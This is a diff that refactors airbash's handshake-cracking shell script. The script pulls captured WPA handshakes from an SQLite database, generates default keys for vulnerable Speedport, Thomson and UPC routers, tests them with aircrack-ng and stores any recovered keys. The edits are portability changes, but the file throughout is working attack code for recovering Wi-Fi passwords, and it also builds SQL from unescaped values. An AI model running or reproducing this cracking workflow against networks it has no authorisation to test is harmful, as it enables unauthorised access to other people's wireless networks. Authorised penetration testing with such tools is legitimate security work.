@@ -1,4 +1,4 @@
-#!/system/bin/sh
+#!/usr/bin/env bash
 # This script is part of airbash (https://github.com/tehw0lf/airbash)
 # Written by tehw0lf
 # Execution of this script will search the handshake database for entries
@@ -6,24 +6,29 @@
 # routers that have known vulnerabilities. Subsequently, the default
 # passwords for any found matches are calculated and tested using aircrack-ng (https://aircrack-ng.org)
 
+
+AIRCRACK_BIN=`which aircrack-ng`
+SQLITE3_BIN=`which sqlite3`
+
 # configure path and file names
 export PATH="$PATH:modules"
-path=/path/to/airbash-folder/
-hs=.hs/
-wl=.wl/
-db=.db.sqlite3
+WDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+path="$WDIR"/
+hs=".hs/"
+wl=".wl/"
+db=".db.sqlite3"
 IFS=$'\n'
-for i in `sqlite3 "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NULL" 2>/dev/null`; do
+for i in `"$SQLITE3_BIN" "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NULL" 2>/dev/null`; do
 	unset IFS
 	# get ssids for current handshake
 	bssid=`echo "$i" | awk -F '|' '{print $4}'`
 	essid=`echo "$i" | awk -F '|' '{print $5}'`
 
 	# check against list of known passwords
-	psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path$wl"known 2>/dev/null | grep FOUND | sort -u | awk '{print $4}'`
+	psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path$wl"known 2>/dev/null | grep FOUND | sort -u | awk '{print $4}'`
 	if [ ${#psk} -gt 7 ]; then
 		echo "Key found for BSSID $bssid: $psk"
-		sqlite3 "$path$db" "UPDATE hs SET psk='$psk', prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
+		"$SQLITE3_BIN" "$path$db" "UPDATE hs SET psk='$psk', prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
 		mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
 		continue
 	fi
@@ -60,12 +65,12 @@ for i in `sqlite3 "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NU
 			done
 		done
 		# test keys
-		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wlspeedport  2>/dev/null | grep FOUND | grep -oE 'SP-[0-9a-zA-Z]{9}' | sort -u`
-		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
+		psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlspeedport  2>/dev/null | grep FOUND | grep -oE 'SP-[0-9a-zA-Z]{9}' | sort -u`
+		"$SQLITE3_BIN" "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
 		rm -f "$path"wl* 2>/dev/null
 		if [ ${#psk} -gt 7 ]; then
 			echo "Key $psk found for BSSID $bssid"
-			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
+			"$SQLITE3_BIN" "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
             echo "$psk" >> "$path$wl"known
 			mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
 			continue
@@ -80,12 +85,12 @@ for i in `sqlite3 "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NU
 		# generate keys
 		`st -o "$path"wlthomson -i $tessid`
 		# test keys
-		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wlthomson  2>/dev/null | grep FOUND | grep -oE '[0-9a-f]{10}' | sort -u`
-		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
+		psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlthomson  2>/dev/null | grep FOUND | grep -oE '[0-9a-f]{10}' | sort -u`
+		"$SQLITE3_BIN" "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
 		rm -f "$path"wl* 2>/dev/null
 		if [ ${#psk} -gt 7 ]; then
 			echo "Key $psk found for BSSID $bssid"
-			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
+			"$SQLITE3_BIN" "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
 			echo "$psk" >> "$path$wl"known
 			mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
 			continue
@@ -105,12 +110,12 @@ for i in `sqlite3 "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NU
 			echo "$j" >> "$path"wlupc
 		done
 		# test keys
-		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wlupc  2>/dev/null | grep FOUND | grep -oE '[0-9A-Z]{8}' | sort -u`
-		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
+		psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlupc  2>/dev/null | grep FOUND | grep -oE '[0-9A-Z]{8}' | sort -u`
+		"$SQLITE3_BIN" "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
 		rm -f "$path"wl* 2>/dev/null
 		if [ ${#psk} -gt 7 ]; then
 			echo "Key $psk found for BSSID $bssid"
-			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
+			"$SQLITE3_BIN" "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
 			echo "$psk" >> "$path$wl"known
 			mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
 			continue
@@ -128,7 +133,7 @@ for i in `sqlite3 "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NU
 #			echo "$j" >> "$path"wltmplate
 #		done
 #		# test keys
-#		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wltmplate  2>/dev/null | grep FOUND | grep -oE 'charset&length' | sort -u`
+#		psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wltmplate  2>/dev/null | grep FOUND | grep -oE 'charset&length' | sort -u`
 #		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
 #		rm -f "$path"wl* 2>/dev/null
 #		# insert to db if key recovery successful
